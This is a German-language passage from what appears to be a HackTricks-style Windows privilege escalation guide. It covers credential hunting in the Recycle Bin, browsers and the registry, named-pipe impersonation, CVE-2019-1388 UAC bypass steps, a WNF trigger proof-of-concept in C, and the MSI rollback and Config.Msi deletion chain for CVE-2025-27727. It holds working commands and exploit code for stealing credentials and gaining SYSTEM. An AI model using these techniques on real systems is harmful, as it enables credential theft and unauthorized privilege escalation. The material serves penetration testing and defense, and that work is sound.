Prüfe zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Zugangsdaten hinweisen. Ein nützliches `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Eintrag und die gelöschte Datei im zugehörigen `$R`-Eintrag. Prüfe die Metadaten und die Leseberechtigung der aktuellen Identität, bevor du ein Archiv öffnest. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab. Eine leere Auflistung beweist daher nicht, dass keine wiederherstellbaren Backups existieren. Betrachte einen Archivnamen als Kandidaten für eine Überprüfung, nicht als Beweis dafür, dass das Archiv ein gültiges Geheimnis enthält.

Eine zugängliche gelöschte `.pfx`-Datei kann auch ein Hinweis auf **Code-Signing** sein. Wenn sie einen zugänglichen privaten Schlüssel enthält, kann dieser einen geänderten PowerShell-Skript signieren; [PowerShell benötigt ein Code-Signing-Zertifikat mit privatem Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Publisherregeln prüfen die Identität des Signierers und den Geltungsbereich der Regel](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Die Ausführung unter einem anderen Konto erfordert, dass die aktuelle Identität genau das betreffende Skript ändern kann, eine wirksame Regel die resultierende Signatur für das Skript und das Zielkonto akzeptiert und ein geplanter Task oder ein anderer Prozess mit höheren Berechtigungen das Skript tatsächlich ausführt. Ein `.pfx`-Dateiname, der Betreff eines Zertifikats oder ein beschreibbares Skript allein belegt diese Kette nicht. Prüfe Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor du privates Schlüsselmaterial öffnest oder den Task auslöst.

Prüfe auch zugängliche Profildatenbanken von Messaging-Clients, Notizen und empfangene Dateien auf Hinweise auf Zugangsdaten. Ein BitLocker-Wiederherstellungsschlüsselexport kann als HTML oder TXT gespeichert sein, mitunter in einem Backup-Archiv mit entsprechendem Namen. Solches Material kann Zugriff auf ein separates verschlüsseltes Daten-Volume ermöglichen, das ältere Backups enthält; prüfe das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Wenn ein Backup `NTDS.dit` enthält, ist für die Offline-Wiederherstellung von Domänenzugangsdaten außerdem der passende `SYSTEM`-Hive erforderlich, wie im [Workflow zu Backups und privilegierten Gruppen](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänenbackup vorhanden ist.

Um in mehreren Programmen gespeicherte **Passwörter wiederherzustellen**, kannst du Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Zugangsdaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**OpenSSH-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Sie sollten nach Datenbanken suchen, in denen Passwörter aus **Chrome oder Firefox** gespeichert sind.\
Sie sollten nach Datenbanken suchen, in denen Passwörter aus **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfen Sie auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Beim standardmäßigen Edge-Profil **Default** des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den Speicherort des Standardprofils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein von Dateien ist lediglich ein Hinweis auf einen möglichen Anmeldedatenspeicher: Prüfen Sie, ob die Dateien lesbar sind, ob der DPAPI-Kontext des betreffenden Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ob ein gespeicherter Login zu einem privilegierteren Konto gehört. Eine reine Pfadermittlung muss weder die Datenbank öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils zusammengehörige Schlüssel- und verschlüsselte Login-Dateien sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfen Sie, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor Sie zu dem Schluss kommen, dass die Anmeldedaten nutzbar sind. Gehört ein wiederhergestellter Zugang zu einem Domänenkonto, prüfen Sie separat die effektiven Gruppenverwaltungsrechte dieses Kontos sowie die [LAPS-Berechtigungen zum Lesen oder Entschlüsseln von Passwörtern](../active-directory-methodology/laps.md) der Gruppe; Browser-Artefakte allein weisen keinen Pfad zu Administratorrechten nach.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird durch eine **class ID (CLSID)** identifiziert und stellt Funktionen über eine oder mehrere Schnittstellen bereit, die durch interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** beziehungsweise **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

In den CLSIDs dieser Registry finden Sie den Unterschlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread-unabhängig) sein kann.

![Browserverlauf – COM DLL Overwriting: In den CLSIDs dieser Registry finden Sie den Unterschlüssel InProcServer32, der einen Standardwert enthält, der auf eine DLL verweist, sowie einen Wert...](<../../images/image (729).png>)

Wenn Sie grundsätzlich **eine der auszuführenden DLLs überschreiben** können, könnten Sie **Ihre Rechte ausweiten**, falls diese DLL von einem anderen Benutzer ausgeführt wird.

Informationen dazu, wie Angreifer COM Hijacking als Persistenzmechanismus verwenden, finden Sie hier:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Passwortsuche in Dateien und Registry**

**Dateiinhalte durchsuchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Nach einer Datei mit einem bestimmten Dateinamen suchen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Die Registry nach Schlüsselnamen und Passwörtern durchsuchen**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf-Plugin. Ich habe dieses Plugin erstellt, um automatisch jedes Metasploit-POST-Modul auszuführen, das im Opfer nach Zugangsdaten sucht.**\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die die auf dieser Seite erwähnten Passwörter enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** von verschiedenen Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stell dir vor, **ein als SYSTEM laufender Prozess öffnet einen neuen Prozess** (`OpenProcess()`) mit **vollständigem Zugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **vollständigen Zugriff auf den Prozess mit niedrigen Berechtigungen** hast, kannst du dir das **offene Handle zum privilegierten Prozess**, das mit `OpenProcess()` erstellt wurde, holen und **Shellcode injizieren**.\
[Lies dieses Beispiel, um mehr darüber zu erfahren, **wie diese Schwachstelle erkannt und ausgenutzt werden kann**.](leaked-handle-exploitation.md)\
[Lies auch [diesen Beitrag für eine ausführlichere Erklärung dazu, wie man weitere offene Handles von Prozessen und Threads testet und missbraucht, die mit unterschiedlichen Berechtigungsstufen (nicht nur vollständigem Zugriff) vererbt wurden](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared-Memory-Segmente, sogenannte **Pipes**, ermöglichen die Kommunikation und Datenübertragung zwischen Prozessen.

Windows bietet eine Funktion namens **Named Pipes**, mit der nicht miteinander verbundene Prozesse Daten austauschen können, auch über verschiedene Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur, deren Rollen als **Named-Pipe-Server** und **Named-Pipe-Client** festgelegt sind.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, die **Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** identifizierst, der über eine Pipe kommuniziert, die du nachahmen kannst, hast du die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Das folgende Tool ermöglicht außerdem, **eine Named-Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Mit diesem Tool kannst du alle Pipes auflisten und anzeigen, um privescs zu finden:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv: Remote-DWORD-Schreibzugriff bis hin zu RCE

Der Telephony-Dienst (TapiSrv) stellt im Servermodus `\\pipe\\tapsrv` (MS-TRP) bereit. Ein entfernter, authentifizierter Client kann den auf Mailslots basierenden asynchronen Ereignispfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibzugriff** auf jede vorhandene Datei umzuwandeln, in die `NETWORK SERVICE` schreiben kann. Anschließend kann er Telephony-Administratorrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser`, gesetzt auf einen beschreibbaren, vorhandenen Pfad → der Dienst öffnet die Datei mit `CreateFileW(..., OPEN_EXISTING)` und verwendet sie für asynchrone Ereignisschreibvorgänge.
- Jedes Ereignis schreibt den vom Angreifer kontrollierten Wert `InitContext` aus `Initialize` in dieses Handle. Registriere eine Line-App mit `LRegisterRequestRecipient` (`Req_Func 61`), löse `TRequestMakeCall` aus (`Req_Func 121`), rufe das Ereignis mit `GetAsyncEvents` ab (`Req_Func 0`) und hebe anschließend die Registrierung auf bzw. fahre den Dienst herunter, um die deterministischen Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu, stelle die Verbindung erneut her und rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Informationen:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateierweiterungen, die unter Windows Code ausführen können

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an.

### Missbrauch von Protokollhandlern / ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete, anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Befehlszeilen auf Passwörter überwachen**

Wenn du eine Shell als Benutzer erhältst, werden möglicherweise geplante Tasks oder andere Prozesse ausgeführt, die **Zugangsdaten in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen, vergleicht den aktuellen Zustand mit dem vorherigen und gibt alle Unterschiede aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Von einem Benutzer mit niedrigen Privilegien zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Benutzeroberfläche hast (über die Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, als nicht privilegierter Benutzer ein Terminal oder einen anderen Prozess als „NT\AUTHORITY SYSTEM“ auszuführen.

Dadurch ist es möglich, mit derselben Schwachstelle gleichzeitig die Berechtigungen zu erweitern und UAC zu umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und ausgestellt.

Zu den betroffenen Systemen gehören unter anderem:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von Administrator mit mittlerem zu hohem Integritätslevel / UAC-Bypass

Lies dies, um **Integritätslevel kennenzulernen**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies anschließend dies, um **UAC und UAC-Bypasses kennenzulernen:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions im Upload-Verzeichnis in ein vom Webserver bereitgestelltes Stammverzeichnis

Eine Anwendung kann ein vorhersehbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer vorgegebenen Dateinamen hineinschreiben und die Datei anschließend verarbeiten. Wenn ein Benutzer mit geringen Berechtigungen dieses Unterverzeichnis entfernen und durch eine NTFS-Junction ersetzen kann, bevor der serverseitige Schreibvorgang erfolgt, kann der Schreibvorgang der Junction in ein vom Webserver bereitgestelltes Verzeichnis folgen. Ein dort abgelegtes Skript kann unter der Identität des Webdienstes ausgeführt werden, sofern der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibvorgänge; ein beschreibbares Upload-Verzeichnis oder eine bestehende Junction allein beweist dies nicht.

Prüfe die genaue Pfadkonstruktion und den Zeitpunkt im Upload-Handler, die effektiven Berechtigungen des Benutzers zum Löschen und Erstellen des Unterverzeichnisses, die effektiven ACLs des Ziels, ob der Schreibvorgang Reparse Points folgt und ob der Webserver Dateien in diesem Ziel ausführt. Bestätige die Prozessidentitäten des Schreibvorgangs und des Webservers getrennt. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten anzeigen, aber nicht das Verhalten des Handlers oder einen künftigen Austausch gegen eine Junction belegen. Wenn die Ausführung in einem Dienstkonto erfolgt, untersuche das **tatsächliche Prozesstoken**, bevor du einen separaten Pfad über Token-Berechtigungen in Betracht ziehst.

## Durch WNF ausgelöste Bereinigung privilegierter geplanter Aufgaben

Eine geplante Aufgabe, deren manuelle Ausführung verweigert wird, kann trotzdem einen Trigger offenlegen, den ein unprivilegierter Benutzer auslösen kann. Exportiere beim Audit einer privilegierten Aufgabe deren XML und prüfe **alle** Trigger sowie die DACL, den Prinzipal und die Aktion der Aufgabe. Insbesondere benennt ein `WnfStateChangeTrigger` einen Status des Windows Notification Facility (WNF). Wenn dieser sicherbare Status dem aktuellen Benutzer erlaubt, eine Aktualisierung zu veröffentlichen, kann der Benutzer die Aufgabe indirekt unter der konfigurierten Identität starten, obwohl `<AllowStartOnDemand>false</AllowStartOnDemand>` gesetzt ist.<sup>[[43]](#references)</sup>

Beispielsweise lief die Recall-Aufgabe `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` als SYSTEM, akzeptierte Aktualisierungen des WNF-Status `7508BCA32C079E41` von einem Standardbenutzer und untersuchte anschließend `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, selbst wenn Recall deaktiviert war.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Um die Erreichbarkeit zu testen, löse `ZwUpdateWnfStateData` aus `ntdll.dll` auf, übermittle ein leeres Update für den acht Byte langen Zustandsnamen und gleiche den Rückgabestatus mit den Daten zum letzten Lauf der Aufgabe oder den Procmon-Aktivitäten ab. Die folgende reduzierte Probe verwendet die Bytefolge aus dem Recall-Aufgabenbeispiel; ersetze sie durch die für die getestete Aufgabe exportierten Bytes.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Rekursive Bereinigung in privilegiertes Löschen umwandeln

Die nützliche Primitive ist nicht allein der Trigger, sondern eine privilegierte Bereinigungsroutine, die ein vom Angreifer kontrolliertes Verzeichnis akzeptiert. Verfolge den Vorgang von der Auflistung bis zur abschließenden Änderung: Profilsitzungs-Erkennung, durch Wildcards ausgewählte untergeordnete Elemente, `SHCreateItemFromParsingName` und `IFileOperation::DeleteItem` sind starke Hinweise darauf, dass ein zuvor überprüfter Pfad später rekursiv durchlaufen wird. Werden Nachfahren nicht relativ zu vertrauenswürdigen Verzeichnishandles geöffnet und vor dem Löschen validiert, kann ein Angreifer die Pfadauflösung zwischen Auflistung und Verwendung ändern.<sup>[[43]](#references)</sup>

Kombiniere den WNF-Trigger mit der unten beschriebenen [oplock-, junction- und Object-Manager-Symlink-Substitution](#from-folder-contents-delete-to-system-eop): Der oplock hält den Cleaner an, nachdem er das legitime untergeordnete Element ausgewählt hat. Währenddessen wird der beschreibbare Vorfahr ersetzt, sodass der fortgesetzte privilegierte Löschvorgang über `\RPC Control` zum geschützten Ziel aufgelöst wird. In der Recall-Kette führte dies zum Löschen von `C:\Config.Msi` durch SYSTEM, das für die dokumentierte MSI-Rollback-Technik erforderlich war.<sup>[[31]](#references)[[43]](#references)</sup>

### Verschachtelte Nachfahren umgehen oberflächliche Reparse-Point-Fixes

Die Validierung allein des vom Angreifer kontrollierten Stammverzeichnisses und seines direkten untergeordneten Elements schützt nicht vor einem rekursiven pfadbasierten Löschvorgang. Lass diese überprüften Objekte legitim und verlagere die junction-/oplock-Substitution in ein weiteres untergeordnetes Element darunter; `IFileOperation::DeleteItem` erreicht schließlich den nicht validierten Nachfahren und folgt dessen neuem Ziel. CVE-2026-20941 entstand genau durch diese Art unvollständigen Fixes: Der erste Recall-Patch validierte `UKP` und das GUID-förmige Verzeichnis, behielt aber den alten rekursiven Löschvorgang bei.<sup>[[43]](#references)</sup>

Das sichere Muster besteht darin, **jeden Nachfahren** relativ zu einem bereits vertrauenswürdigen Verzeichnis-Handle zu öffnen, den endgültig aufgelösten Pfad bzw. das endgültig aufgelöste Objekt abzurufen und zu überprüfen und die Löschdisposition auf das überprüfte Handle anzuwenden. Validiere kein Präfix und kehre anschließend zu einem rekursiven pfadbasierten Löschvorgang zurück. Überprüfe bei der Patch-Prüfung außerdem die Strukturen am tatsächlichen Aufrufort: In diesem Fall zeigte die Laufzeitinspektion von `OBJECT_ATTRIBUTES` bei `NtCreateFile` ein nicht-null `RootDirectory` und einen relativen Namen `{GUID}\\secure_file.lock`. Damit wurde die irreführende Decompiler-Ausgabe widerlegt, die auf eine zweite `FILE_DELETE_ON_CLOSE`-Primitive hindeutete.<sup>[[43]](#references)</sup>

## Von beliebigem Löschen/Verschieben/Umbenennen von Ordnern zu SYSTEM-EoP

Die Technik wird [**in diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschrieben; Exploit-Code ist [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird die Rollback-Funktion von Windows Installer ausgenutzt, um während der Deinstallation legitime Dateien durch schädliche zu ersetzen. Dazu muss der Angreifer einen **schädlichen MSI-Installer** erstellen, mit dem der Ordner `C:\Config.Msi` übernommen wird. Windows Installer verwendet diesen später, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien zu speichern; diese Dateien wurden zuvor so verändert, dass sie die schädliche Payload enthalten.

### Injektion in den Windows Installer-COM-Bereinigungspfad (CVE-2025-27727)

Ein Benutzer mit geringen Rechten kann über das `CMsiConfigurationManager`-COM-Objekt (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Beim Reverse Engineering wurden die relevanten `IMsiServer`-Aufrufe als `MsiBeginTransactionW` bei Vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` bei `0xC8` und `CleanupTempPackages` bei `0x50` identifiziert. Diese Namen und Offsets wurden durch Reverse Engineering ermittelt und können je nach Build variieren.<sup>[[41]](#references)</sup>

Bei einem Nicht-Administrator imitiert `SetEEUIDirectoryAndFilter` den Aufrufer nur während des Öffnens des angegebenen Pfads mit `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT`. Damit wird nachgewiesen, dass der Aufrufer das Verzeichnis löschen kann, und verhindert, dass einem Reparse Point gefolgt wird. Es wird jedoch **nicht** sichergestellt, dass das überprüfte Dateiobjekt bei der späteren Bereinigung verwendet wird, und auch nicht nachgewiesen, dass Windows Installer es erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` plant `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner ein. Der Dienst schreibt einen benannten `REG_DWORD`-Wert unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: Der Wertname ist der vom Aufrufer kontrollierte Pfad, und der Wert `0x00000002` kennzeichnet einen Ordner. `CleanupTempPackages(NULL, FALSE)` startet anschließend die Bereinigung direkt. Der privilegierte Worker listet die Registrierungswerte auf und übergibt Ordnereinträge an die rekursive Funktion `FDeleteFolder`, ohne die Herkunft der Pfade zu überprüfen. Schlägt das normale Entfernen fehl, ruft der Code außerdem `LockdownPath` auf, löscht die Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die aus `msi.dll` ermittelte minimale Aufrufsequenz lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitive ist die Wiederverwendung eines Pfads und nicht die Umleitung über eine Junction. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lasse Windows Installer später denselben Pfad mit geschützten Rollback-Daten neu erstellen. Die Bereinigung vertraut dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Damit wird die vorgesehene Grenze von `FILE_FLAG_OPEN_REPARSE_POINT` und der Mitigation für das Vertrauen in Umleitungen umgangen, da kein Reparse Point erforderlich ist.<sup>[[41]](#references)</sup>

Dieses Lösch-Primitive passt in die folgende Rollback-Kette: Behalte den separaten Eintrag `Installer\Folders` bei, lösche das geschützte `C:\Config.Msi`, erstelle es mit einer NULL-DACL neu und behalte ein Handle mit `WRITE_DAC`, bevor der Installer die DACL absichert. Mit dem vorab geöffneten Handle kann über `NtSetSecurityObject` eine permissive DACL wiederhergestellt werden. Danach lässt sich die erzeugte `.rbs` ersetzen, bevor das Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad behoben, indem `CMsiTransaction::SetEEUIDirectoryAndFilter` daran gehindert wird, `ScheduleFileOrFolderDelete` aufzurufen, wenn das neue Feature-Gate aktiviert ist. Der COM-Aufruf kann weiterhin Erfolg zurückgeben, trägt den vom Angreifer kontrollierten Pfad jedoch nicht mehr in `TempPackages` ein. Installiere die Windows-Sicherheitsupdates vom April 2025, statt einen erfolgreichen Methodenaufruf als Patch-Test zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik sieht wie folgt aus:

1. **Phase 1 – Vorbereitung des Hijacks (`C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
    - Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Markiere den Installer als **„UAC Compliant“**, damit ein **Nicht-Administrator** ihn ausführen kann.
    - Behalte nach der Installation ein **Handle** für die Datei geöffnet.

- Schritt 2: Deinstallation starten
    - Deinstalliere dieselbe `.msi`.
    - Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
    - **Überwache das geöffnete Datei-Handle** mithilfe von `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Benutzerdefinierte Synchronisierung
    - Die `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, wenn die `.rbf` geschrieben wurde.
        - Danach auf ein weiteres Ereignis **wartet**, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Wenn das Signal eintrifft, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — dadurch **wird ihr Löschen verhindert**.
    - Sende dann ein Signal zurück, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da er nicht alle Inhalte löschen kann, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Lösche (als Angreifer) die `.rbf`-Datei manuell.
    - Jetzt ist **`C:\Config.Msi` leer** und bereit, gehijackt zu werden.

> An diesem Punkt kannst du die **Schwachstelle zum Löschen beliebiger Ordner auf SYSTEM-Ebene** auslösen, um `C:\Config.Msi` zu löschen.

2. **Phase 2 – Rollback-Skripte durch schädliche Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
    - Erstelle den Ordner `C:\Config.Msi` selbst neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **behalte ein Handle mit `WRITE_DAC` geöffnet**.

- Schritt 7: Eine weitere Installation ausführen
    - Installiere die `.msi` erneut mit:
        - `TARGETDIR`: Beschreibbarer Speicherort.
